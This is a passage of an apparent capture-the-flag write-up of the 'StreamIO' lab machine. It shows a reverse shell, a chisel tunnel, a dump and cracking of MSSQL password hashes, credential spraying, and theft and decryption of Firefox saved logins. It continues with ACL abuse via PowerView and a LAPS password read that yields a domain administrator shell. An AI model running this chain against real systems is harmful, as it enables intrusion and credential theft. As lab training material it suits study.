+Listening on 0.0.0.0 443
+Connection received on 10.10.11.158
+Windows PowerShell running as user DC$ on DC
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\inetpub\streamio.htb\admin> </span><span class="am">whoami</span><span class="p">
+streamio\yoshihide
+PS C:\inetpub\streamio.htb\admin></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-nikk37">
+<br><h3 class="post-title">Shell - nikk37</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:1433:127.0.0.1:1433  
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ chisel server</span><span class="p"> --reverse --port 9999  
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999
+server: session#1: tun: proxy#R:1433=>1433: Listening  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">streamio.htb/db_admin:B1@hx31234567890@localhost -db streamio_backup  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: streamio_backup
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC): Line 1: Changed database context to 'streamio_backup'.
+[*] INFO(DC): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sysdatabases;
+
+name
+--------------------------------------------------------------------------  
+
+master
+tempdb
+model
+msdb
+STREAMIO
+streamio_backup
+
+SQL></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from streamio_backup.sys.tables;
+
+name
+--------------------------------------------------------------------------  
+
+movies
+users
+
+SQL></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from streamio_backup.sys.columns where object_id = object_id('users');
+
+name
+---------------------------------------------------------------------------------------  
+
+id
+username
+password
+
+SQL></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select username,password from streamio_backup.dbo.users;
+
+username                             password
+----------------------------------   ------------------------------------------  
+
+nikk37                               389d14cb8e4e9b94b137deb1caf0612a
+yoshihide                            b779ba15cedfd22a023c4d8bcf5f2332
+James                                c660060492d9edcaa8332d89c99c9239
+Theodore                             925e5408ecb67aea449373d668b7359e
+Samantha                             083ffae904143c4796e464dac33c1f7d
+Lauren                               08344b85b329d7efd611b7a7743e8a09
+William                              d62be0dc82071bccc1322d64ec5b6c51
+Sabrina                              f87d3c0d6c8fd686aacc6627f1f493a5
+
+SQL></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-MD5  
+Using default input encoding: UTF-8
+Loaded 8 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
+Remaining 5 password hashes with no different salts
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">get_dem_girls2@yahoo.com</span><span class="p"> (</span><span class="am">nikk37</span><span class="p">)
+</span><span class="am">66boysandgirls..</span><span class="p">         (</span><span class="am">yoshihide</span><span class="p">)
+</span><span class="am">##123a8j8w5123##</span><span class="p">         (</span><span class="am">Lauren</span><span class="p">)
+</span><span class="am">!!sabrina$</span><span class="p">               (</span><span class="am">Sabrina</span><span class="p">)
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb streamio.htb -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ve">[+] </span><span class="p">streamIO.htb\nikk37:get_dem_girls2@yahoo.com
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm streamio.htb -u nikk37 -p get_dem_girls2@yahoo.com
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    5985   DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)  
+</span><span class="az">HTTP        </span><span class="p">streamIO.htb    5985   DC               </span><span class="az">[*] </span><span class="p">http://streamIO.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">streamIO.htb    5985   DC               </span><span class="ve">[+] </span><span class="p">streamIO.htb\nikk37:get_dem_girls2@yahoo.com </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i streamio.htb -u nikk37 -p get_dem_girls2@yahoo.com  
+PS C:\Users\nikk37\Documents> </span><span class="am">whoami</span><span class="p">
+streamio\nikk37
+PS C:\Users\nikk37\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
+a87**************************033
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="am">upload </span><span class="p">winpeas.exe
+</span><span class="az">
+Info: Uploading winpeas.exe to C:\Users\nikk37\Documents\winpeas.exe  
+</span><span class="sa">
+Data: 2581844 bytes of 2581844 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">ÉÍÍÍÍÍÍÍÍÍÍ¹ </span><span class="ve">Looking for Firefox DBs
+</span><span class="az">È  </span><span class="am">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
+    </span><span class="ro">Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="am">download </span><span class="p">C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
+</span><span class="az">
+Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db to key4.db
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\nikk37\Documents> </span><span class="am">download </span><span class="p">C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json  
+</span><span class="az">
+Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json to logins.json
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">firepwd.py       
+globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
+       }
+     }
+   }
+   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
+ }
+clearText b'70617373776f72642d636865636b0202'
+password check? True
+ SEQUENCE {
+   SEQUENCE {
+     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
+     SEQUENCE {
+       SEQUENCE {
+         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
+         SEQUENCE {
+           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'  
+           INTEGER b'01'
+           INTEGER b'20'
+           SEQUENCE {
+             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
+           }
+         }
+       }
+       SEQUENCE {
+         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
+         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
+       }
+     }
+   }
+   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
+ }
+clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
+decrypting login/password pairs
+https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
+https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
+https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
+https://slack.streamio.htb:b'JDgodd',b'password@12'</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">admin:JDg0dd1s@d0p3cr3@t0r
+nikk37:n1kk1sd0p3t00:)
+yoshihide:paddpadd@12
+JDgodd:password@12</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb streamio.htb -u users.txt -p passwords.txt --continue-on-success
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\admin:n1kk1sd0p3t00 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\nikk37:n1kk1sd0p3t00 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\yoshihide:n1kk1sd0p3t00 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ve">[+] </span><span class="p">streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\JDgodd:n1kk1sd0p3t00 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    5985   DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)  
+</span><span class="az">HTTP        </span><span class="p">streamIO.htb    5985   DC               </span><span class="az">[*] </span><span class="p">http://streamIO.htb:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">streamIO.htb    5985   DC               </span><span class="ro">[-] </span><span class="p">streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ bloodhound-python</span><span class="p"> -u JDgodd -p JDg0dd1s@d0p3cr3@t0r -c All -d streamio.htb -dc dc.streamio.htb -ns 10.10.11.158 --zip  
+INFO: Found AD domain: streamio.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: streamio.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: streamio.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 8 users
+INFO: Found 54 groups
+INFO: Found 4 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.streamIO.htb
+INFO: Done in 00M 30S
+INFO: Compressing output into 20230504074848_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<a href="/htb/streamio/13.png" target="_blank"><div><p><img src="/htb/streamio/13.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="am">upload </span><span class="p">PowerView.ps1
+</span><span class="az">
+Info: Uploading PowerView.ps1 to C:\Users\nikk37\Documents\PowerView.ps1  
+</span><span class="sa">
+Data: 1027036 bytes of 1027036 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\nikk37\Documents> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">'JDg0dd1s@d0p3cr3@t0r' </span><span class="c1">-AsPlainText -Force</span><span class="p">
+PS C:\Users\nikk37\Documents> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">'streamio.htb\JDgodd'</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)  
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="am">Add-DomainObjectAcl </span><span class="c1">-TargetIdentity </span><span class="az">'Core Staff' </span><span class="c1">-PrincipalIdentity </span><span class="az">'streamio\JDgodd' </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">  
+PS C:\Users\nikk37\Documents> </span><span class="am">Add-DomainGroupMember </span><span class="c1">-Identity </span><span class="az">'Core Staff' </span><span class="c1">-Members </span><span class="az">'streamio\JDgodd' </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">JDgodd | </span><span class="am">Select </span><span class="p">Name  
+
+Name
+----
+Domain Users
+CORE STAFF
+
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\nikk37\Documents> </span><span class="am">Get-ADComputer </span><span class="p">DC</span><span class="c1"> -Property </span><span class="az">'ms-mcs-admpwd' </span><span class="c1">-Credential </span><span class="ve">$Cred</span><span class="p">  
+
+DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
+DNSHostName       : DC.streamIO.htb
+Enabled           : True
+ms-mcs-admpwd     : 0r7eg}r04VVu5u
+Name              : DC
+ObjectClass       : computer
+ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
+SamAccountName    : DC$
+SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
+UserPrincipalName :
+
+PS C:\Users\nikk37\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ lapsdumper </span><span class="p">-u JDGodd -p JDg0dd1s@d0p3cr3@t0r -d streamio.htb  
+DC 0r7eg}r04VVu5u</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb streamio.htb -u Administrator -p </span><span class="az">'0r7eg}r04VVu5u'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">streamIO.htb    445    DC               </span><span class="ve">[+] </span><span class="p">streamIO.htb\Administrator:0r7eg}r04VVu5u </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i streamio.htb -u Administrator -p </span><span class="am">'0r7eg}r04VVu5u'</span><span class="p">  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+streamio\administrator
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Administrator\Documents> </span><span class="am">dir </span><span class="p">C:\Users </span><span class="c1">-recurse </span><span class="p">root.txt
+
+    Directory: C:\Users\Martin\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        5/22/2023   4:20 AM             34 root.txt
+
+PS C:\Users\Administrator\Documents> </span><span class="am">dir </span><span class="p">C:\Users </span><span class="c1">-recurse </span><span class="p">root.txt | </span><span class="am">type</span><span class="p">  
+d41**************************fcc
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+-->
